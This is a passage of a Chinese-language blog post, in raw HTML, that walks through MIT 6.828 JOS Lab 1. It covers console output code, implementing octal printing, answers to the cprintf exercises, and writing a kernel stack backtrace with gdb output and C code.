I/O delay routine necessitated by historical PC design flaws</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">delay</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    inb(<span class="hljs-number">0x84</span>);<br>    inb(<span class="hljs-number">0x84</span>);<br>    inb(<span class="hljs-number">0x84</span>);<br>    inb(<span class="hljs-number">0x84</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>serial_putc()</code> 的功能已经明了：检查对应端口状态，写入字符，接下来我们来看 <code>lpt_putc()</code>，还是从一个奇怪的端口读取数据并检查，之后向另外两个端口写入奇怪的数据，因为笔者不是硬件相关开发者所以这里就不深究了（笑）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/***** Parallel port output code *****/</span><br><span class="hljs-comment">// For information on PC parallel port programming, see the class References</span><br><span class="hljs-comment">// page.</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">lpt_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; !(inb(<span class="hljs-number">0x378</span>+<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0x80</span>) &amp;&amp; i &lt; <span class="hljs-number">12800</span>; i++)<br>        delay();<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">0</span>, c);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>|<span class="hljs-number">0x04</span>|<span class="hljs-number">0x01</span>);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后是 <code>cga_putc()</code>，这是实现字符规范化字符打印的<strong>核心函数</strong>：</p><ul><li><p>首先检查若未设置颜色参数则默认设置黑底白字</p></li><li><p>之后是对特殊字符的处理，对于普通字符则是直接写显存</p></li><li><p>在完成之后检查光标是否越界，若是则进行<strong>滚屏</strong>，这里实现的方法比较简单粗暴，直接移动整块内存后清空最后一行，将光标位置向前移动80字符（一行的宽度）</p></li><li><p>最后向显卡对应寄存器写入光标位置</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cga_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-comment">// if no attribute given, then use black on white</span><br>    <span class="hljs-keyword">if</span> (!(c &amp; ~<span class="hljs-number">0xFF</span>))<br>        c |= <span class="hljs-number">0x0700</span>;<br><br>    <span class="hljs-keyword">switch</span> (c &amp; <span class="hljs-number">0xff</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\b&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (crt_pos &gt; <span class="hljs-number">0</span>) &#123;<br>            crt_pos--;<br>            crt_buf[crt_pos] = (c &amp; ~<span class="hljs-number">0xff</span>) | <span class="hljs-string">&#x27; &#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\n&#x27;</span>:<br>        crt_pos += CRT_COLS;<br>        <span class="hljs-comment">/* fallthru */</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\r&#x27;</span>:<br>        crt_pos -= (crt_pos % CRT_COLS);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\t&#x27;</span>:<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        crt_buf[crt_pos++] = c;        <span class="hljs-comment">/* write the character */</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// What is the purpose of this?</span><br>    <span class="hljs-keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;<br>        <span class="hljs-type">int</span> i;<br><br>        memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>));<br>        <span class="hljs-keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>            crt_buf[i] = <span class="hljs-number">0x0700</span> | <span class="hljs-string">&#x27; &#x27;</span>;<br>        crt_pos -= CRT_COLS;<br>    &#125;<br><br>    <span class="hljs-comment">/* move that little blinky thing */</span><br>    outb(addr_6845, <span class="hljs-number">14</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos &gt;&gt; <span class="hljs-number">8</span>);<br>    outb(addr_6845, <span class="hljs-number">15</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这个实现方法和笔者当时写实验性质 OS kernel 的时候倒是一样，不过令笔者不爽的是 xv6 将 <code>\t</code> 实现为别扭的 5 个空格（恼）</p></blockquote><p>这么一轮分析下来这个字符输出原语已经基本上分析得差不多了，剩下的一些高级的封装函数笔者就不深入分析贴在这里了，主要就是借助这个字符输出原语实现的一些 tricks，其中对于格式化字符串输出 xv6 实现为 <code>printfmt()</code> 函数，其核心为 <code>vprintfmt()</code> 函数，主要是用一个有穷自动状态机解析格式化字符串并从栈上读取参数输出。</p><p>接下来是 Exercise 8，补充格式化字符串打印中的 <code>%o</code> 参数的实现</p><blockquote><p>Exercise 8. We have omitted a small fragment of code - the code necessary to print octal numbers using patterns of the form “%o”. Find and fill in this code fragment.</p></blockquote><p>xv6 非常贴心地将数字输出实现为一个无前缀的多进制输出函数 <code>printnum()</code> ，参考 glibc 中 printf 的 8 进制输出是没有前缀的，我们只需要从栈上获取对应数值、设置 base后直接跳转调用即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// (unsigned) octal</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;o&#x27;</span>:<br>    <span class="hljs-comment">// Replace this with your code.</span><br>    num = getuint(&amp;ap, lflag);<br>    base = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">goto</span> number;<br><br><span class="hljs-comment">//...</span><br><br>number:<br>    printnum(putch, putdat, num, base, width, padc);<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>内核入口点是 <code>kern/entry.S</code>，之后会调用到 <code>kern/init.c</code> 中的 <code>i386_init()</code>，其中有一句调用了 %o 的输出语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cprintf(<span class="hljs-string">&quot;6828 decimal is %o octal!\n&quot;</span>, <span class="hljs-number">6828</span>);<br></code></pre></td></tr></table></figure><p>我们 make clean 之后重新 make 再 make qemu，查看效果，成功实现 %o 的输出功能：</p><p><img src="https://s2.loli.net/2022/03/15/T8WRyaDCi1blp9M.png" alt="image.png"></p><p>最后是 6.828 的一些练习题：</p><ol><li><p>Explain the interface between printf.c and console.c. Specifically, what function does console.c export? How is this function used by printf.c?</p><p><code>console.c</code> 提供了单个字符输出的函数 <code>cputchar()</code>，在 <code>printf.c</code> 中封装为 <code>putch()</code> 函数进行单个字符的输出</p></li><li><p>Explain the following from console.c:</p><p>1 if (crt_pos &gt;&#x3D; CRT_SIZE) {<br>2 int i;<br>3 memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * sizeof(uint16_t));<br>4 for (i &#x3D; CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>5 crt_buf[i] &#x3D; 0x0700 | ‘ ‘;<br>6 crt_pos -&#x3D; CRT_COLS;<br>7 }</p><p>这段代码的作用是<strong>在光标超出 80 x 24 显示区域时进行滚屏</strong>，主要原理就是将第一行往后的数据都向前移动一行，光标向前清空一行的显存为空格后向前移动一行（行宽 80 字符）</p></li><li><p>For the following questions you might wish to consult the notes for Lecture 2. These notes cover GCC’s calling convention on the x86.</p><p>Trace the execution of the following code step-by-step:</p><p>int x &#x3D; 1, y &#x3D; 3, z &#x3D; 4;<br>cprintf(“x %d, y %x, z %d\n”, x, y, z);</p><ul><li><p>In the call to <code>cprintf()</code>, to what does <code>fmt</code> point? To what does <code>ap</code> point?</p><p><del>二进制选手的送分题，</del>指向格式化字符串的指针与 x、y、z 三个参数都在栈上，<code>fmt</code> 指针指向存放格式化字符串的位置，这里应该是位于 .data 段上，<code>ap</code> 则指向栈上的参数 x</p></li><li><p>List (in order of execution) each call to <code>cons_putc</code>, <code>va_arg</code>, and <code>vcprintf</code>. For <code>cons_putc</code>, list its argument as well. For <code>va_arg</code>, list what <code>ap</code> points to before and after the call. For <code>vcprintf</code> list the values of its two arguments.</p><p><del>题目太长不看。</del> <code>cons_putc</code> 的参数为要输出的字符的数据，定义为一个 int 类型，实际上只用到了低 2 字节，第一个字节为 ASCII 码，第二个字节为显示的字符颜色与背景色；对于 <code>va_arg</code> 而言，<code>ap</code>指向栈上的某个位置，这个位置上应当存放着我们的可变长参数组中的某个参数，在调用后其会指向下一个参数；<code>vcprintf</code> 的两个参数一个是格式化字符串，另一个则是 <code>va_arg</code> 容器</p></li></ul></li><li><p>Run the following code.</p><p>unsigned int i &#x3D; 0x00646c72;<br>cprintf(“H%x Wo%s”, 57616, &amp;i);</p><p>What is the output? Explain how this output is arrived at in the step-by-step manner of the previous exercise. <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Here’s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the x86 is little-endian. If the x86 were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Here’s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p><p>将代码添加到 <code>init.c</code> 中，实测输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">He110 World<br></code></pre></td></tr></table></figure><p>57616 作为 16 进制输出为 e110，而 变量 i 的值被作为一个字符串解析（我们输入的参数为指向 i 的指针），因此输出 “rld”；如果是大端序的话前者不会有变化而后者因为直接碰到 “\0” 于是什么也不输出</p></li><li><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><p>cprintf(“x&#x3D;%d y&#x3D;%d”, 3);</p><p>y会是一个相对随机的值，有一定概率会是一个指向栈上的指针（old rbp），关键得看编译器生成的代码；这是因为我们在调用 cprintf 时在格式字符串中写有两个参数，但我们只传了一个参数，cprintf 会从栈上存放 3 的位置再往后读一个参数打印出来</p></li><li><p>Let’s say that GCC changed its calling convention so that it pushed arguments on the stack in declaration order, so that the last argument is pushed last. How would you have to change <code>cprintf</code> or its interface so that it would still be possible to pass it a variable number of arguments?</p><p>使用最后一个参数来指定参数的数量即可。</p></li></ol><p>最后还有个打印不同颜色的 Challenge，懒得做了</p><h3 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h3><p>这一节主要讲 x86 下 C 的函数运行时栈与调用约定，并编写一个能够打印堆栈 backtrace 的函数（类似于 Linux 内核 crash 以后打印错误的那种函数）</p><p>首先是 Exercise 9，找到内核栈初始化的代码、内核栈在内存中的位置，以及内核保留栈空间的方法与堆栈指针被初始化指向该空间的位置</p><blockquote><p>Exercise 9. Determine where the kernel initializes its stack, and exactly where in memory its stack is located. How does the kernel reserve space for its stack? And at which “end” of this reserved area is the stack pointer initialized to point to?</p></blockquote><p>在内核入口函数中在调用 <code>i386_init()</code> 之前有一段代码初始化了内核栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># Clear the frame pointer register (EBP)<br># so that once we get into debugging C code,<br># stack backtraces will be terminated properly.<br>movl    $0x0,%ebp            # nuke frame pointer<br><br># Set the stack pointer<br>movl    $(bootstacktop),%esp<br><br># now to C code<br>call    i386_init<br></code></pre></td></tr></table></figure><p>我们上手调试一下，结果如下，我们看到堆栈指针寄存器（esp）指向 <code>0xf0110000</code>，而栈帧指针寄存器（ebp）指向 0 地址，关于这两个寄存器之间的关系笔者不再赘叙，请各位读者自行复习 C 函数调用栈相关知识，可以看到这里我们的内核栈被初始化到内存高地址中一个固定的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs gdb">relocated () at kern/entry.S:74<br>74        movl    $0x0,%ebp            # nuke frame pointer<br>(gdb) si<br>=&gt; 0xf0100034 &lt;relocated+5&gt;:    mov    $0xf0110000,%esp<br>relocated () at kern/entry.S:77<br>77        movl    $(bootstacktop),%esp<br>(gdb) si<br>=&gt; 0xf0100039 &lt;relocated+10&gt;:    call   0xf01000aa &lt;i386_init&gt;<br>80        call    i386_init<br>(gdb) info registers<br>eax            0xf010002f          -267386833<br>ecx            0x0                 0<br>edx            0xffffff40          -192<br>ebx            0x10094             65684<br>esp            0xf0110000          0xf0110000 &lt;entry_pgtable&gt;<br>ebp            0x0                 0x0<br>esi            0x10094             65684<br>edi            0x0                 0<br>eip            0xf0100039          0xf0100039 &lt;relocated+10&gt;<br>eflags         0x86                [ PF SF ]<br>cs             0x8                 8<br>ss             0x10                16<br>ds             0x10                16<br>es             0x10                16<br>fs             0x10                16<br>gs             0x10                16<br>(gdb) <br></code></pre></td></tr></table></figure><p>6.828 文档中向我们揭示了栈回溯的原理：按照 C 函数调用栈的相关约定，ebp指针指向栈底，这个位置上存放了上一层调用的 ebp，再往后一个位置存放的是该函数的返回地址，即上层调用函数中调用了这个函数的指令的下一条指令的地址，因此利用 ebp 我们便可以回溯多层函数调用栈</p><p>下面看 Exercise 10，主要是让我们通过调试感知 C 函数调用栈</p><blockquote><p>Exercise 10. To become familiar with the C calling conventions on the x86, find the address of the <code>test_backtrace</code> function in obj&#x2F;kern&#x2F;kernel.asm, set a breakpoint there, and examine what happens each time it gets called after the kernel starts. How many 32-bit words does each recursive nesting level of <code>test_backtrace</code> push on the stack, and what are those words?</p><p>Note that, for this exercise to work properly, you should be using the patched version of QEMU available on the <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html">tools</a> page or on Athena. Otherwise, you’ll have to manually translate all breakpoint and memory addresses to linear addresses.</p></blockquote><p>然后是 Exercise 11，让我们补全实现 <code>mon_backtrace()</code></p><blockquote><p>Exercise 11. Implement the backtrace function as specified above. Use the same format as in the example, since otherwise the grading script will be confused. When you think you have it working right, run make grade to see if its output conforms to what our grading script expects, and fix it if it doesn’t. <em>After</em> you have handed in your Lab 1 code, you are welcome to change the output format of the backtrace function any way you like.</p><p>If you use <code>read_ebp()</code>, note that GCC may generate “optimized” code that calls <code>read_ebp()</code> <em>before</em> <code>mon_backtrace()</code>‘s function prologue, which results in an incomplete stack trace (the stack frame of the most recent function call is missing). While we have tried to disable optimizations that cause this reordering, you may want to examine the assembly of <code>mon_backtrace()</code> and make sure the call to <code>read_ebp()</code> is happening after the function prologue.</p></blockquote><p>我们需要实现打印如下格式的栈回溯</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">Stack backtrace:<br>  ebp f0109e58  eip f0100a62  args <span class="hljs-number">00000001</span> f0109e80 f0109e98 f0100ed<span class="hljs-number">2 00000031</span><br>  ebp f0109ed8  eip f<span class="hljs-number">01000d6</span>  args <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> f<span class="hljs-number">0100058</span> f0109f<span class="hljs-number">28 00000061</span><br>  ...<br></code></pre></td></tr></table></figure><p>在内核初始化时将 ebp 设为了0，这提供给我们一个很好的作为判断栈回溯终止的条件，最终的栈回溯函数代码如下，由于 6.828 说他们提供的 <code>read_ebp()</code> 函数可能会被编译器优化掉所以笔者自己写了内联汇编：</p><blockquote><p>AT &amp; T 语法，非常🥚疼</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br>    <span class="hljs-comment">// Your code here.</span><br>    <span class="hljs-type">uint32_t</span> *old_ebp, last_eip;<br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;movl %%ebp, %0;&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (old_ebp))</span>;<br>    cprintf(<span class="hljs-string">&quot;Stack backtrace:\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (old_ebp)<br>    &#123;<br>        last_eip = old_ebp[<span class="hljs-number">1</span>];<br>        cprintf(<span class="hljs-string">&quot;  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n&quot;</span>, <br>            old_ebp, last_eip, old_ebp[<span class="hljs-number">2</span>], old_ebp[<span class="hljs-number">3</span>], old_ebp[<span class="hljs-number">4</span>], old_ebp[<span class="hljs-number">5</span>], old_ebp[<span class="hljs-number">6</span>]);<br>        old_ebp = (<span class="hljs-type">uint32_t</span> *) old_ebp[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果如下，成功打印栈回溯：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make qemu</span><br>sed &quot;s/localhost:1234/localhost:26000/&quot; &lt; .gdbinit.tmpl &gt; .gdbinit<br>qemu-system-i386 -drive file=obj/kern/kernel.img,index=0,media=disk,format=raw -serial mon:stdio -gdb tcp::26000 -D qemu.log <br>6828 decimal is 15254 octal!<br>entering test_backtrace 5<br>entering test_backtrace 4<br>entering test_backtrace 3<br>entering test_backtrace 2<br>entering test_backtrace 1<br>entering test_backtrace 0<br>Stack backtrace:<br>  ebp f010ff18  eip f01000a5  args 00000000 00000000 00000000 f010004e f0111308<br>  ebp f010ff38  eip f010007a  args 00000000 00000001 f010ff78 f010004e f0111308<br>  ebp f010ff58  eip f010007a  args 00000001 00000002 f010ff98 f010004e f0111308<br>  ebp f010ff78  eip f010007a  args 00000002 00000003 f010ffb8 f010004e f0111308<br>  ebp f010ff98  eip f010007a  args 00000003 00000004 00000000 f010004e f0111308<br>  ebp f010ffb8  eip f010007a  args 00000004 00000005 00000000 f010004e f0111308<br>  ebp f010ffd8  eip f01000fc  args 00000005 00001aac 00000640 00000000 00000000<br>  ebp f010fff8  eip f010003e  args 00000003 00001003 00002003 00003003 00004003<br>leaving test_backtrace 0<br>leaving test_backtrace 1<br>//...<br></code></pre></td></tr></table></figure><p>最后是 lab 1 的最后一个练习——Exercise 12，要求我们打印栈回溯信息的同时打印函数名、函数位于的源文件及他们在源文件中的行号</p><blockquote><p>Exercise 12. Modify your stack backtrace function to display, for each eip, the function name, source file name, and line number corresponding to that eip.</p><p>In <code>debuginfo_eip</code>, where do _<em>STAB</em>* come from? This question has a long answer; to help you to discover the answer, here are some things you might want to do:</p><ul><li>look in the file kern&#x2F;kernel.ld for _<em>STAB</em>*</li><li>run objdump -h obj&#x2F;kern&#x2F;kernel</li><li>run objdump -G obj&#x2F;kern&#x2F;kernel</li><li>run gcc -pipe -nostdinc -O2 -fno-builtin -I. -MD -Wall -Wno-format -DJOS_KERNEL -gstabs -c -S kern&#x2F;init.c, and look at init.s.</li><li>see if the bootloader loads the symbol table in memory as part of loading the kernel binary</li></ul><p>Complete the implementation of <code>debuginfo_eip</code> by inserting the call to <code>stab_binsearch</code> to find the line number for an address.</p><p>Add a backtrace command to the kernel monitor, and extend your implementation of <code>mon_backtrace</code> to call <code>debuginfo_eip</code> and print a line for each stack frame of the form:</p><p>K&gt; backtrace<br>Stack backtrace:<br> ebp f010ff78 eip f01008ae args 00000001 f010ff8c 00000000 f0110580 00000000<br> kern&#x2F;monitor.c:143: monitor+106<br> ebp f010ffd8 eip f0100193 args 00000000 00001aac 00000660 00000000 00000000<br> kern&#x2F;init.c:49: i386_init+59<br> ebp f010fff8 eip f010003d args 00000000 00000000 0000ffff 10cf9a00 0000ffff<br> kern&#x2F;entry.S:70: +0<br>K&gt;</p><p>Each line gives the file name and line within that file of the stack frame’s eip, followed by the name of the function and the offset of the eip from the first instruction of the function (e.g., monitor+106 means the return eip is 106 bytes past the beginning of monitor).</p><p>Be sure to print the file and function names on a separate line, to avoid confusing the grading script.</p><p>Tip: printf format strings provide an easy, albeit obscure, way to print non-null-terminated strings like those in STABS tables. <code>printf(&quot;%.*s&quot;, length, string)</code> prints at most <code>length</code> characters of <code>string</code>. Take a look at the printf man page to find out why this works.</p><p>You may find that some functions are missing from the backtrace. For example, you will probably see a call to <code>monitor()</code> but not to <code>runcmd()</code>. This is because the compiler in-lines some function calls. Other optimizations may cause you to see unexpected line numbers. If you get rid of the -O2 from GNUMakefile, the backtraces may make more sense (but your kernel will run more slowly).</p></blockquote><p>我们如果要从头实现这个功能的话可能会有点麻烦，好在 JOS 为我们提供了一个可以实现该功能的库函数 <code>debuginfo_eip()</code>，直接拿来用就行</p><p>在拿来用之前我们需要注意其并未实现行号功能，我们还需要手动在 <code>kern/debug.c</code> 中补全实现，这一块原理比较复杂，主要靠其提供的 <code>stab_binsearch()</code> 函数实现，感兴趣的可以了解一下 stab：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Search within [lline, rline] for the line number stab.</span><br><span class="hljs-comment">// If found, set info-&gt;eip_line to the right line number.</span><br><span class="hljs-comment">// If not found, return -1.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint:</span><br><span class="hljs-comment">//    There&#x27;s a particular stabs type used for line numbers.</span><br><span class="hljs-comment">//    Look at the STABS documentation and &lt;inc/stab.h&gt; to find</span><br><span class="hljs-comment">//    which one.</span><br><span class="hljs-comment">// Your code here.</span><br>stab_binsearch(stabs, &amp;lfun, &amp;rfun, N_SLINE, addr - info-&gt;eip_fn_addr);<br><br><span class="hljs-keyword">if</span> (lfun &lt;= rfun)<br>&#123;<br>    info-&gt;eip_line = stabs[lfun].n_desc;<br>&#125;<br>  <span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 backtrace 中需要注意的是其提供的函数名指针并非以 <code>\0</code> 结尾所以我们还需要手动指定输出长度，最终 backtrace 函数的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br><span class="hljs-title function_">mon_backtrace</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br>    <span class="hljs-comment">// Your code here.</span><br>    <span class="hljs-type">uint32_t</span> *old_ebp, last_eip;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Eipdebuginfo</span> <span class="hljs-title">eipdebuginfo</span>;</span><br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;movl %%ebp, %0;&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (old_ebp))</span>;<br>    cprintf(<span class="hljs-string">&quot;Stack backtrace:\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (old_ebp)<br>    &#123;<br>        last_eip = old_ebp[<span class="hljs-number">1</span>];<br>        debuginfo_eip(last_eip, &amp;eipdebuginfo);<br>        cprintf(<span class="hljs-string">&quot;  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n&quot;</span>, <br>            old_ebp, last_eip, old_ebp[<span class="hljs-number">2</span>], old_ebp[<span class="hljs-number">3</span>], old_ebp[<span class="hljs-number">4</span>], old_ebp[<span class="hljs-number">5</span>], old_ebp[<span class="hljs-number">6</span>]);<br>        cprintf(<span class="hljs-string">&quot;         %s:%d: &quot;</span>, <br>            eipdebuginfo.eip_file, eipdebuginfo.eip_line);<br>        cprintf(<span class="hljs-string">&quot;%.*s+%d\n&quot;</span>,<br>            eipdebuginfo.eip_fn_namelen, eipdebuginfo.eip_fn_name, last_eip - eipdebuginfo.eip_fn_addr);<br>        old_ebp = (<span class="hljs-type">uint32_t</span> *) old_ebp[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终运行效果如下：</p><p><img 